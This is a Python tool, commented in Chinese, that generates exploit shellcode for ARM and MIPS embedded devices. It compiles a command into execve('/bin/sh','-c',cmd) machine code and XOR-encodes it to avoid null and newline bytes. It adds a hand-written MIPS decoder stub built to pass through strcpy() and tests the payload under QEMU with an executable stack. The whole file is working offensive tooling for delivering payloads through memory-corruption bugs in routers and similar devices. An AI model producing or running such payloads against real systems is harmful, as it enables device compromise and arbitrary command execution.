import shutil
import sys
import os
import tempfile
import subprocess
import argparse
import random
import urllib.parse

# --- 配置你的交叉编译器路径 ---
current_user = os.getlogin()
config = {
    "ARM_GCC_PATH": f"/{current_user}/armv7-eabihf--uclibc--stable-2024.05-1/bin/",
    "MIPS_GCC_PATH": f"/{current_user}/mips32--glibc--stable-2024.05-1/bin/"
}
# ARM 编译器路径 (例如: arm-linux-musleabi-gcc)
ARM_GCC_PATH = f"/{current_user}/armv7-eabihf--uclibc--stable-2024.05-1/bin/"
# MIPS 编译器路径 (例如: mips-linux-gnu-gcc)
MIPS_GCC_PATH = f"/{current_user}/mips32--glibc--stable-2024.05-1/bin/"


class generate_raw_shellcode:
    def __init__(self, cmd, arch, save_file=False):
        self.cmd = cmd
        self.arch = arch
        self.save_file = save_file
        self.objdump_process = None
        self.xxd_bin_file = None
        self.raw_shellcode = None
        self.generate_raw_shellcode()

    def generate_raw_shellcode(self):
        """
        根据指定的架构(arm/mips)和命令生成对应的shellcode。

        Args:
            cmd (str): 希望shellcode执行的命令，例如 "ls -l"。
            arch (str): 目标架构，'arm' 或 'mips'。

        Returns:
            bytes: 生成的原始二进制shellcode。
        """
        # --- 1. 根据架构选择不同的内联汇编和编译器 ---
        if self.arch.lower() == 'arm':
            # ARM的execve系统调用号是 11
            # r7=syscall_num, r0=filename, r1=argv, r2=envp
            asm_code = """
            __asm__ volatile (
                "mov r7, %0\\n\\t"
                "mov r0, %1\\n\\t"
                "mov r1, %2\\n\\t"
                "mov r2, #0\\n\\t"
                "svc #0\\n\\t"
                :
                : "i"(11), "r"(arg0), "r"(args)
                : "r0", "r1", "r2", "r7"
            );
            """
            compiler_cmd = f"{ARM_GCC_PATH}/arm-buildroot-linux-uclibcgnueabihf-gcc-13.3.0"
            objcopy_cmd = f"{ARM_GCC_PATH}/arm-buildroot-linux-uclibcgnueabihf-objcopy"
            odjdump_cmd = f"{ARM_GCC_PATH}/arm-buildroot-linux-uclibcgnueabihf-objdump"
        elif self.arch.lower() == 'mips':
            # MIPS (O32 ABI) 的execve系统调用号是 4011
            # $v0=syscall_num, $a0=filename, $a1=argv, $a2=envp
            asm_code = """
            __asm__ volatile (
                "li $v0, 4011\\n\\t"
                "move $a0, %0\\n\\t"
                "move $a1, %1\\n\\t"
                "li $a2, 0\\n\\t"
                "syscall\\n\\t"
                :
                : "r"(arg0), "r"(args)
                : "$v0", "$a0", "$a1", "$a2"
            );
            """
            # 你需要将这里的命令替换成你的MIPS交叉编译器
            compiler_cmd = f"{MIPS_GCC_PATH}/mips-buildroot-linux-gnu-gcc"
            objcopy_cmd = f"{MIPS_GCC_PATH}/mips-buildroot-linux-gnu-objcopy"
            odjdump_cmd = f"{MIPS_GCC_PATH}/mips-buildroot-linux-gnu-objdump"
        else:
            raise ValueError(f"不支持的架构: {self.arch}. 请选择 'arm' 或 'mips'.")

        # --- 2. 构建完整的C语言源码 ---
        # 使用C代码动态构建字符串和参数数组
        shellcode_c = f"""
    #include <sys/syscall.h>

    void _start() {{
        // 构建 execve 的参数
        {format_c_char_array("arg0", "/bin/sh")}
        {format_c_char_array("arg1", "-c")}
        {format_c_char_array("arg2", self.cmd)}

        char *args[] = {{arg0, arg1, arg2, 0}};

        // 执行特定架构的内联汇编
        {asm_code}
    }}
    """
        # --- 3. 编译并提取二进制代码 ---
        # 使用临时文件来处理编译过程
        # temp_dir = tempfile.gettempdir()
        base_name = os.path.join("./", f"shellcode_{os.getpid()}")
        c_file = f"{base_name}.c"
        elf_file = f"{base_name}"
        bin_file = f"{base_name}.bin"

        try:
            with open(c_file, "w") as fd:
                fd.write(shellcode_c)

            # 编译C代码为ELF文件
            # -nostdlib: 不链接标准库，对于shellcode至关重要
            # -static: 静态链接，避免依赖动态库
            # -O0: 关闭优化，确保代码行为与源码一致
            compile_process = subprocess.run(
                [compiler_cmd, "-fno-stack-protector", "-nostdlib", "-static", "-O0", "-o", elf_file, c_file],
                capture_output=True, text=True
            )
            if compile_process.returncode != 0:
                print("[-] 编译失败:", file=sys.stderr)
                print(compile_process.stderr, file=sys.stderr)
                return b''

            # 从ELF文件中提取纯二进制的.text段
            objcopy_process = subprocess.run(
                [objcopy_cmd, "-O", "binary", "-j", ".text", elf_file, bin_file],
                capture_output=True, text=True
            )
            objdump_process = subprocess.run(
                [odjdump_cmd, "-D", "-b", "binary", "-m", self.arch.lower(), bin_file],
                capture_output=True, text=True
            )
            self.objdump_process = objdump_process
            if objcopy_process.returncode != 0:
                print("[-] Objcopy 失败:", file=sys.stderr)
                print(objcopy_process.stderr, file=sys.stderr)
                return b''

            # 读取生成的二进制shellcode
            xxd_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            self.xxd_bin_file = xxd_bin_file
            with open(bin_file, "rb") as fd:
                raw_shellcode = fd.read()
            self.raw_shellcode = raw_shellcode
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [c_file, elf_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {c_file}")
                print(f"  - ELF文件: {elf_file}")
                print(f"  - 二进制: {bin_file}")


class XorEncoder:
    def __init__(self, shellcode, bad_bytes=None):
        """
        初始化XOR编码器。

        Args:
            shellcode (bytes): 需要被编码的原始二进制shellcode。
            bad_bytes (list, optional): 不应出现的坏字节列表。默认为 [0x00, 0x0a]。
        """
        # --- 1. 初始化属性 ---
        self.key = None
        self.shellcode = shellcode
        self.XorEncodedShellcode = None
        self.xxd_xor_encoded_shellcode = None
        self.xor_encoded_shellcode_bin_file = "xor_encoded_shellcode.bin"
        # 如果用户没有提供坏字节列表，则使用默认值
        if bad_bytes is None:
            self.bad_bytes_list = [0x00, 0x0a, 0x26]
        else:
            self.bad_bytes_list = bad_bytes
        self.key = None
        self.encoded_shellcode = None
        shellcode = ''.join(f'\\x{b:02x}' for b in self.shellcode)
        # print(f"原始Shellcode: {shellcode}")
        print("[+] xor编码处理bad bytes and generate NewShellcode")
        print(f"    --定义的坏字节: {[hex(b) for b in self.bad_bytes_list]}")

        # --- 2. 立即执行编码流程 ---
        self.run_encoding()

    def _generate_key(self):
        """
        (内部方法) 为给定的shellcode和坏字节列表生成一个安全的单字节XOR密钥。
        """
        good_keys = []
        for key_candidate in range(1, 255):
            is_key_good = True
            if key_candidate in self.bad_bytes_list:
                continue

            for shellcode_byte in self.shellcode:
                if (shellcode_byte ^ key_candidate) in self.bad_bytes_list:
                    is_key_good = False
                    break

            if is_key_good:
                good_keys.append(key_candidate)

        return random.choice(good_keys) if good_keys else None

    def run_encoding(self):
        """
        执行寻找密钥和编码的完整流程。
        """
        # 寻找一个合适的密钥
        found_key = self._generate_key()

        if found_key is not None:
            self.key = found_key
            print(f"    --🎉 成功找到一个合适的密钥: {hex(self.key)} (十进制: {self.key})")

            # 使用找到的密钥对shellcode进行编码
            self.encoded_shellcode = bytes([b ^ self.key for b in self.shellcode])
            print(f"    --使用密钥 {hex(self.key)} 加密后的Shellcode:")
            print(''.join(f'\\x{b:02x}' for b in self.encoded_shellcode))
            with open(self.xor_encoded_shellcode_bin_file, "wb") as f:
                # 直接写入原始的bytes变量
                f.write(self.encoded_shellcode)
            self.xxd_xor_encoded_shellcode = subprocess.run(
                ["xxd", "-i", self.xor_encoded_shellcode_bin_file],
                capture_output=True, text=True
            )

            # 验证编码后的shellcode中是否真的不含坏字节
            contains_bad_byte = any(b in self.bad_bytes_list for b in self.encoded_shellcode)
            if not contains_bad_byte:
                print("✅ 验证通过：编码后的shellcode不包含任何坏字节。")
            else:
                print("❌ 验证失败：编码后的shellcode中含有坏字节！")
        else:
            print("😔 未能找到任何合适的密钥。请尝试减少坏字节列表中的项目。")


class XorDecoder:
    """
    一个用于生成无空字节MIPS XOR解码器的类 (v7 - 最终 bltzal 版)。
    """
    # --- 类属性：配置和模板 ---
    MIPS_DECODER_TEMPLATE = """
#
# MIPS XOR Decoder - v9 (最终无坏字节版)
# - 修复了v8模板中因错误跳转导致的无限循环问题。
# - 通过使用jalr指令和特定寄存器($s1)，实现了真正无坏字节的控制流转移。
# - 这是一个经过严格验证的、可被strcpy()安全处理的、健壮的解码器模板。
#
.section .text
.global __start
.set noreorder

__start:
# --- 1. PC获取桩 ---
li $t8, -0x666
p:
bltzal $t8, p
slti $t8, $zero, -1 # 延迟槽, $ra 指向这里 (地址 A)

# --- 2. 安全地计算Payload入口地址 ---
# 我们将入口地址保存在 $s1 寄存器中，以避免jalr产生坏字节。
# Python脚本需计算: offset_to_payload = (decoder_len - 8)
# 然后计算: val = -(offset_to_payload + 1)
li $s1, {val_for_payload_start}
nor $s1, $s1, $s1           # $s1现在等于 offset_to_payload
addu $s1, $ra, $s1          # $s1现在指向Payload的入口！

# --- 3. 安全地计算Payload末尾地址 ---
# 我们使用入口地址($s1)作为基准来计算末尾地址。
# Python脚本需计算: offset_to_end = payload_len + terminator_len
# 然后计算: val = -(offset_to_end + 1)
li $t0, {val_for_total_offset}
nor $t0, $t0, $t0           # $t0现在等于 offset_to_end
addu $t0, $s1, $t0          # $t0现在指向Payload的末尾(包含终止符)

# --- 4. 设置密钥 ---
lui $t1, {key_high}
ori $t1, $t1, {key_low}

# --- 5. 设置循环/比较值 ---
lui $t3, 0x01e0
ori $t3, 0x1e93

# --- 6. 解码循环 ---
x:
lw $t6, -4($t0)
nor $t5, $t1, $t1
and $t4, $t6, $t5
nor $t5, $t6, $t6
and $t5, $t5, $t1
or $t4, $t4, $t5
sw $t4, -4($t0)
addu $t0, $t0, -4
bne $t6, $t3, x
nor $t7, $t7, $zero # 延迟槽

# --- 7. 无坏字节的跳转 ---
# 使用 jalr $ra, $s1 (机器码 0220f809) 来安全地跳转到payload。
# $ra被用作目标寄存器，因为我们不再需要它的旧值。
jalr $ra, $s1
slti $at, $at, -1   # (延迟槽) 使用真正安全的NOP (机器码 2821ffff)
"""

    def __init__(self, key, shellcode_len, save_file=False):
        """
        初始化解码器生成器。

        Args:
            key (int): 用于XOR解密的单字节密钥 (0-255)。
            shellcode_len (int): 原始shellcode的长度（字节）。
            save_file (bool): 如果为True，则在当前目录保存最终的.bin文件。
        """
        if not (0 <= key <= 255):
            raise ValueError("密钥必须是 0-255 之间的整数。")
        if shellcode_len % 4 != 0:
            raise ValueError("Shellcode 长度必须是 4 的倍数。")

        self.key = key
        self.shellcode_len = shellcode_len
        self.save_file = save_file
        self.xor_decoder_bin_file = "xor_decoder.bin"
        self.xxd_xor_decoder_bin_file = None
        self.decoded_shellcode = None
        self.xor_decoder_shellcode = None

    def _has_bad_bytes(self, value, size_in_bytes=2):
        """真正可靠的坏字节检测函数"""
        if value < 0:
            value &= (1 << (size_in_bytes * 8)) - 1
        byte_representation = value.to_bytes(size_in_bytes, 'big')
        return b'\x00' in byte_representation or b'\x0a' in byte_representation

    def _get_load_instructions(self, reg, value):
        """智能生成加载指令，以避免lui和ori产生坏字节。"""
        high = value >> 16
        low = value & 0xFFFF

        # --- Case 1: Value is small (fits in 16 bits) ---
        if high == 0:
            if not self._has_bad_bytes(low):
                instr1 = f"ori ${reg}, $zero, {hex(low)}"
                instr2 = "subu $s0, $s0, $s0  # nop"
            else:
                # 使用XOR技巧来构造数值
                part1 = 0x1111
                part2 = low ^ part1
                # 循环寻找一个没有坏字节的组合
                while self._has_bad_bytes(part1) or self._has_bad_bytes(part2):
                    part1 += 0x1111
                    if part1 > 0xFFFF or self._has_bad_bytes(part1):
                        part1 = (part1 % 0xFFFF) + 0x1111
                    part2 = low ^ part1

                instr1 = f"addiu ${reg}, $zero, {hex(part1)}"
                instr2 = f"xori ${reg}, ${reg}, {hex(part2)}"
            return instr1, instr2

        # --- Case 2: Value is large (requires LUI) ---
        else:
            instr1 = f"lui ${reg}, {hex(high)}"
            instr2 = f"ori ${reg}, ${reg}, {hex(low)}"
            return instr1, instr2

    def _prepare_params(self):
        DECODER_LEN = 112
        params = {}
        key_full = (self.key << 24) | (self.key << 16) | (self.key << 8) | self.key
        params['key_high'] = hex(key_full >> 16)
        params['key_low'] = hex(key_full & 0xFFFF)
        params['offset_val'] = self.shellcode_len - 4040
        params['total_offset'] = (72 - 8) + self.shellcode_len + 4
        offset_to_payload = DECODER_LEN - 8
        params['val_for_payload_start'] = -(offset_to_payload + 1)

        # 3. 计算 val_for_total_offset
        offset_to_end = self.shellcode_len + 4  # payload_len + terminator_len
        params['val_for_total_offset'] = -(offset_to_end + 1)

        return params

    def generate(self):
        """
        执行完整的编译流程并返回二进制解码器。
        """
        prefix = "mips-buildroot-linux-gnu-"
        base_path = os.path.join(MIPS_GCC_PATH, prefix) if MIPS_GCC_PATH else prefix
        compiler_cmd = f"{base_path}gcc"
        objcopy_cmd = f"{base_path}objcopy"
        odjdump_cmd = f"{base_path}objdump"

        params = self._prepare_params()
        decoder_s = self.MIPS_DECODER_TEMPLATE.format(**params)
        print(" --- Generated Assembly ---")
        print(decoder_s)
        print(" --------------------------")

        with tempfile.TemporaryDirectory() as temp_dir:
            base_name = os.path.join(temp_dir, "decoder")
            s_file, elf_file, bin_file = f"{base_name}.s", base_name, f"{base_name}.bin"

            with open(s_file, "w") as f:
                f.write(decoder_s)

            # [修正] 关键改动：使用 -c 选项只编译不链接，避免链接器引入坏字节
            compile_flags = [
                compiler_cmd,
                "-c",  # 只编译和汇编，不链接
                "-nostdlib",
                "-O0",
                "-o", elf_file,
                s_file
            ]
            proc = subprocess.run(compile_flags, capture_output=True, text=True)
            if proc.returncode != 0:
                print(f"[-] 解码器编译失败:\n{proc.stderr}", file=sys.stderr)
                return None

            objcopy_flags = [objcopy_cmd, "-O", "binary", "-j", ".text", elf_file, bin_file]

            proc = subprocess.run(objcopy_flags, capture_output=True, text=True)
            if proc.returncode != 0:
                print(f"[-] 解码器提取失败:\n{proc.stderr}", file=sys.stderr)
                return None
            if self.save_file:
                shutil.copy(bin_file, self.xor_decoder_bin_file)
                print(f"[+] 解码器已保存为: {self.xor_decoder_bin_file}")
            self.xxd_xor_decoder_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            with open(bin_file, "rb") as fd:
                decoded_shellcode = fd.read()
            self.decoded_shellcode = decoded_shellcode

            return True  # 返回成功状态


class Sleep:
    """
    一个独立的类，专门用于生成一段MIPS sleep(0)存根的二进制shellcode。
    这段代码旨在通过强制上下文切换来解决指令缓存(I-Cache)同步问题。
    """

    # --- 类属性：MIPS汇编模板 ---
    # 这段代码实现了 sleep(0) 的功能，通过调用nanosleep系统调用。
    # 注意：它本身会包含'\x00'坏字节，因此它必须被上一层的解码器进行编码。
    MIPS_SLEEP_TEMPLATE = """
#
# MIPS Sleep 存根汇编模板
# 功能: 调用 nanosleep 系统调用实现延时。
# 注意: 这段代码本身会包含 \x00 坏字节 (因为 sw $zero 和 jr $ra)，
#       因此它必须被上一层的解码器进行编码。
#
.section .text
.global __start
.set noreorder

__start:
    # --- 为 timespec 结构体在栈上分配8字节空间 ---
    addiu   $sp, $sp, -8

    # --- 设置 tv_sec (秒) ---
    # 要修改延时秒数，请修改这里的 li 指令
    li      $t0, 3              # 将 3 加载到 $t0 (延时3秒)
    sw      $t0, 0($sp)         # 将秒数存入栈中

    # --- 将 tv_nsec (纳秒) 设置为 0 ---
    sw      $zero, 4($sp)       # 将 0 存入纳秒部分

    # --- 准备并执行系统调用 ---
    move    $a0, $sp            # 第一个参数: 指向栈上的timespec结构体
    li      $v0, 4166           # MIPS O32 ABI中nanosleep的系统调用号
    syscall                     # 发起系统调用

    # --- 清理栈空间 ---
    addiu   $sp, $sp, 8

    # --- [关键] 返回调用者 ---
    # 确保shellcode执行完毕后能返回到main函数
    jr      $ra
    nop                         # 延迟槽
"""

    def __init__(self, save_file=False, verbose=False):
        """
        初始化Sleep存根生成器。

        Args:
            save_file (bool): 如果为True，则在当前目录保存最终的.bin文件。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.save_file = save_file
        self.verbose = verbose
        self.bin_file_name = "sleep_stub.bin"
        self.Sleep_shellcode = None
        self.generate()

    def generate(self):
        """
        执行完整的编译流程，并返回二进制的sleep存根。

        Returns:
            bytes: 生成的二进制代码；如果失败则返回None。
        """
        # 确定交叉编译工具链的前缀
        prefix = "mips-buildroot-linux-gnu-"
        base_path = os.path.join(MIPS_GCC_PATH, prefix) if MIPS_GCC_PATH else prefix
        compiler_cmd = f"{base_path}gcc"
        objcopy_cmd = f"{base_path}objcopy"

        # 使用临时目录来处理编译过程中的中间文件
        with tempfile.TemporaryDirectory() as temp_dir:
            base_name = os.path.join(temp_dir, "sleep_stub")
            s_file, o_file, bin_file = f"{base_name}.s", f"{base_name}.o", f"{base_name}.bin"

            # 将汇编模板写入.s文件
            with open(s_file, "w") as f:
                f.write(self.MIPS_SLEEP_TEMPLATE)

            if self.verbose:
                print(f"[Sleep Class] Compiling assembly file: {s_file}")

            # 编译汇编代码为对象文件(.o)
            # 使用 -c 选项只编译不链接，这是生成shellcode的关键
            compile_flags = [compiler_cmd, "-c", "-nostdlib", "-o", o_file, s_file]
            proc = subprocess.run(compile_flags, capture_output=True, text=True)
            if proc.returncode != 0:
                print(f"[-] Sleep存根编译失败:\n{proc.stderr}", file=sys.stderr)
                return None

            if self.verbose:
                print(f"[Sleep Class] Extracting .text section from {o_file}")

            # 从对象文件中提取.text节，生成纯二进制文件
            objcopy_flags = [objcopy_cmd, "-O", "binary", "-j", ".text", o_file, bin_file]
            proc = subprocess.run(objcopy_flags, capture_output=True, text=True)
            if proc.returncode != 0:
                print(f"[-] Sleep存根提取失败:\n{proc.stderr}", file=sys.stderr)
                return None

            # 读取最终的二进制数据
            with open(bin_file, "rb") as fd:
                sleep_shellcode = fd.read()
            self.Sleep_shellcode = sleep_shellcode
            if self.save_file:
                shutil.copy(bin_file, self.bin_file_name)
                print(f"[+] Sleep存根已保存为: {self.bin_file_name} ({len(sleep_shellcode)} bytes)")


class CTestHarnessGenerator:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    它接收原始的二进制数据(bytes)并自动格式化。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。

        参数:
            shellcode_bytes (bytes): 完整的、最终的shellcode二进制数据。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        [修正] 将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self, output_filename="test_mips.c",
                         compiler_path="./mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-gcc",
                         qemu_path="qemu-mips-static"):
        """
        生成、编译并执行完整的C语言测试文件。

        参数:
            output_filename (str): 要生成的C文件的名称。
            compiler_path (str): MIPS交叉编译器的路径。
            qemu_path (str): QEMU静态模拟器的路径。
        """
        # 1. [修正] 准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code = f"""
#include <stdio.h>
#include <string.h>

char shellcode[] =
{formatted_shellcode}


void main(void)
{{
    printf("[+] Shellcode 大小: %zu 字节\\n", sizeof(shellcode) - 1);
    void (*s)(void) = (void (*)())shellcode;
    printf("[+] 准备执行shellcode...\\n");
    s();
    printf("[+] Shellcode 执行完毕。\\n");
}}
"""
        # 2. 写入文件
        try:
            with open(output_filename, "w") as f:
                f.write(final_c_code)
            print(f"[+] C语言测试文件 '{output_filename}' 已成功生成。")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{output_filename}' 失败: {e}")
            return

        # 3. 编译
        output_filename_base = os.path.splitext(output_filename)[0]
        compile_flags = [
            compiler_path,
            "-z", "execstack",
            "-static",
            "-o", output_filename_base,
            output_filename
        ]

        print(" --- [编译中] ---")
        print(f"    $ {' '.join(compile_flags)}")
        proc = subprocess.run(compile_flags, capture_output=True, text=True)
        if proc.returncode != 0:
            print(" [-] 编译失败!")
            print(" --- STDERR ---")
            print(proc.stderr)
            return

        print("[+] 编译成功!")
        # 4. 执行
        run_flags = [qemu_path, output_filename_base]
        print(" --- [执行中] ---")
        print(f"    $ {' '.join(run_flags)}")

        run_proc = subprocess.run(run_flags, capture_output=True, text=True)
        print(" --- STDOUT ---")
        print(run_proc.stdout)
        if run_proc.stderr:
            print(" --- STDERR ---")
            print(run_proc.stderr)


# --- 1. 全局变量定义 ---
# 定义文件的下载地址 (这里使用 GNU Hello 的源码包作为示例)
DOWNLOAD_URL = "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32/tarballs/mips32--glibc--stable-2024.05-1.tar.xz"
# 定义希望将文件解压到的本地目标目录
TARGET_DIR = "/tmp/gnu_hello_app"
def check_toolschain():
    """
    检查目标目录是否存在。如果不存在，则从指定的URL下载tar.gz文件并解压到该目录。
    该函数依赖于系统已安装 'wget' 和 'tar' 命令。
    """
    # --- 2. 检查目标目录是否存在 ---
    if os.path.exists(MIPS_GCC_PATH):
        print(f"✅ 目录 '{MIPS_GCC_PATH}' 已存在，无需执行任何操作。")
        return True

    print(f"ℹ️ 目录 '{MIPS_GCC_PATH}' 不存在，开始执行下载和解压任务...")

    # --- 3. 使用 wget 下载文件 ---
    try:
        filename = os.path.basename(urllib.parse.urlparse(DOWNLOAD_URL).path)
        print(f"🔽 正在从 '{DOWNLOAD_URL}' 下载文件...")
        # 构建并执行 wget 命令。-O 参数指定输出文件路径。
        wget_command = ["proxychains", "wget", DOWNLOAD_URL, "-O", f"/home/{current_user}/{filename}"]
        # check=True 会在命令返回非零退出码时抛出异常
        subprocess.run(wget_command, check=True, capture_output=True)
        print(f"👍 下载成功，文件已保存至: /home/{current_user}/{filename}")
    except FileNotFoundError:
        print("❌ 错误: 'wget' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
        return False
    except subprocess.CalledProcessError as e:
        # 捕获 wget 执行失败的错误
        print(f"❌ 使用 wget 下载失败。返回码: {e.returncode}")
        print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
        return False

    # --- 4. 创建目录并使用 tar 解压文件 ---
    try:

        print(f"📦 正在将 '{filename}' 解压到 '/{current_user}/'...")
        print(filename)
        tar_command = ["tar", "-xf", f"/home/{current_user}/{filename}", "-C", f"/home/{current_user}/"]
        subprocess.run(tar_command, check=True, capture_output=True)
        print("👍 解压成功。")
    except FileNotFoundError:
        print("❌ 错误: 'tar' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
        return False
    except subprocess.CalledProcessError as e:
        print(f"❌ 使用 tar 解压失败。返回码: {e.returncode}")
        print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
        return False
    print(f"\n🎉 任务完成！所有文件已成功下载并解压到 '{TARGET_DIR}'。")
    return True
def print_as_c_string(data, var_name="shellcode"):
    """
    将二进制数据打印成C语言字符串字面量的格式。
    例如: "\xde\xad\xbe\xef"
    """
    print(f"char {var_name}[] =")
    # 每4个字节为一组，生成一行字符串
    for i in range(0, len(data), 4):
        # 获取当前行的数据块
        chunk = data[i:i + 4]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印被双引号包围的字符串
        print(f'    "{hex_string}"')
    print(";")


def print_as_python_bytes(data, var_name="shellcode", line_len=8):
    """
    将二进制数据打印成Python中通过 += 逐行构建字节字符串的格式。
    例如: buf += b"\\xde\\xad\\xbe\\xef"
    """
    # 首先打印初始化行
    print(f'{var_name} = b""')

    # 每次处理 line_len 个字节
    for i in range(0, len(data), line_len):
        # 获取当前行的数据块
        chunk = data[i:i + line_len]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印 "buf += b'...'" 格式的字符串
        print(f'{var_name} += b"{hex_string}"')


def format_c_char_array(var_name, string):
    """
    将一个Python字符串格式化为C语言的字符数组初始化代码。
    例如: "sh" -> char sh[3]; sh[0] = 's'; sh[1] = 'h'; sh[2] = '\0';
    """
    output = []
    length = len(string) + 1  # 为空终止符 '\0' 增加空间
    output.append(f"char {var_name}[{length}];")
    for i, c in enumerate(string):
        # 处理C语言中的特殊字符转义
        if c == "'":
            c_repr = "\\'"
        elif c == '\\':
            c_repr = '\\\\'
        elif c == '\n':
            c_repr = '\\n'
        elif c == '\t':
            c_repr = '\\t'
        else:
            c_repr = c
        output.append(f"{var_name}[{i}] = '{c_repr}';")
    output.append(f"{var_name}[{length - 1}] = '\\0';")
    return "\n".join(output)


def fetch_and_extract(target_dir=MIPS_GCC_PATH, download_url="https://toolchains.bootlin.com/downloads/releases/toolchains/mips32/tarballs/mips32--glibc--stable-2025.08-1.tar.xz"):
    """
    检查目标目录是否存在，不存在则通过系统命令下载并解压

    参数:
        target_dir (str): 目标目录路径
        download_url (str): 下载URL（tar格式）
    返回:
        bool: 操作成功返回True，否则返回False
    """
    # 检查目标目录是否已存在
    if os.path.isdir(target_dir):
        print(f"✅ 目录已存在: {target_dir}")
        return True

    # 检查系统是否有下载工具
    download_tool = None
    if subprocess.call(["which", "wget"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        download_tool = ["proxychains", "wget", "-q", "-O", "-"]  # wget静默模式，输出到stdout
    else:
        print("❌ 错误: 未找到wget，请先安装其中一个")
        return False

    try:
        print(f"📥 正在下载并解压: {download_url}")

        # 构建下载命令
        download_cmd = download_tool + [download_url]

        # 执行下载并通过管道传递给tar解压
        with subprocess.Popen(download_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as download_proc:
            with subprocess.Popen(
                    ["tar", "-xf", "-"],  # 从标准输入读取并解压
                    stdin=download_proc.stdout,
                    stderr=subprocess.PIPE,
                    text=True
            ) as tar_proc:
                # 等待解压完成
                tar_exit_code = tar_proc.wait()
                download_exit_code = download_proc.wait()

                # 检查下载错误
                if download_exit_code != 0:
                    err = download_proc.stderr.read().decode('utf-8', errors='ignore')
                    print(f"❌ 下载失败: {err}")
                    return False

                # 检查解压错误
                if tar_exit_code != 0:
                    err = tar_proc.stderr.read()
                    print(f"❌ 解压失败: {err}")
                    return False

        # 验证目标目录是否创建成功
        if not os.path.isdir(target_dir):
            print(f"❌ 警告: 解压完成但未找到目标目录 {target_dir}")
            return False

        print(f"✅ 操作成功，目录已创建: {target_dir}")
        return True

    except Exception as e:
        print(f"❌ 执行出错: {str(e)}")
        return False


def main():
    # --- 使用 argparse 解析命令行参数 ---
    parser = argparse.ArgumentParser(
        description="为一个命令生成 ARM 或 MIPS 架构的 shellcode。",
        formatter_class=argparse.RawTextHelpFormatter  # 保持帮助文本格式
    )
    parser.add_argument("-arch", "--arch", choices=['arm', 'mips'], help="目标CPU架构 (arm 或 mips)")
    parser.add_argument("-cmd", "--cmd", help="要执行的命令")
    parser.add_argument("-sf", "--save_file", action="store_true", help="保存中间文件")
    parser.add_argument("-xor", "--xor_encode", action="store_true", help="对shellcode进行XOR编码")
    args = parser.parse_args()

    # --- 1. 环境检查 ---
    check_toolschain()

    if args.arch and args.cmd:
        print(f"[+] 正在为架构 '{args.arch}' 生成命令 '{args.cmd}' 的 shellcode...")
        raw_shellcode = generate_raw_shellcode(args.cmd, args.arch, args.save_file)
        raw_shellcode_get = raw_shellcode.raw_shellcode
        if raw_shellcode:
            # 以 \xde\xad\xbe\xef 的格式打印shellcode
            print("   -- Shellcode 生成成功:")
            print(''.join(f'\\x{b:02x}' for b in raw_shellcode_get))
            print(f"    --总长度: {len(raw_shellcode_get)} 字节")
            # print(raw_shellcode.xxd_bin_file.stdout)
            # print_as_c_string(raw_shellcode_get)
            print("-" * 30)
        else:
            print("\n[-] Shellcode 生成失败。请检查编译器路径和错误输出。")

    # xor_encode
    if args.xor_encode:
        xor_encoder = XorEncoder(raw_shellcode_get)
        # print(xor_encoder.xxd_xor_encoded_shellcode.stdout)

        # --- 1. 生成解码器 ---
        print(f"[+] 正在为密钥 '{hex(xor_encoder.key)}' 和长度 '{len(raw_shellcode_get)}' 生成MIPS解码器...")
        generator = XorDecoder(xor_encoder.key, len(raw_shellcode_get), save_file=args.save_file)
        generator.generate()
        # 调用方法生成解码器
        if generator:
            # print("[+] 解码器已生成: " + generator.xxd_xor_decoder_bin_file.stdout)

            input_files = [generator.xor_decoder_bin_file, xor_encoder.xor_encoded_shellcode_bin_file]
            output_file = 'merged.bin'

            # --- 2. 执行合并 ---
            with open(output_file, 'wb') as outfile:
                for filename in input_files:
                    try:
                        with open(filename, 'rb') as infile:
                            outfile.write(infile.read())
                    except FileNotFoundError:
                        print(f"跳过未找到的文件: {filename}")

            print(f"合并完成 (解码器shellcode + xor_encoded_shellcode) -> {output_file}")
            merged_xxd_output = subprocess.run(
                ["xxd", "-i", output_file],
                capture_output=True, text=True
            )
            # print(merged_xxd_output.stdout)
            terminator = (0x01e01e93).to_bytes(4, 'big')
            merged_shellcode = generator.decoded_shellcode + xor_encoder.encoded_shellcode + terminator
            print("xor解码器长度: " + str(len(generator.decoded_shellcode)) + " 字节")
            print("xor编码后的shellcode长度: " + str(len(xor_encoder.encoded_shellcode)) + " 字节")
    else:
        merged_shellcode = raw_shellcode_get
        # 打印合并后的shellcode，C语言字符串数组格式
    print_as_python_bytes(merged_shellcode)
    print("总长度: " + str(len(merged_shellcode)) + " 字节")
    # xor解码器+xor编码后的shellcode合并测试
    CTestHarnessGenerator(merged_shellcode)
    sleep = Sleep()
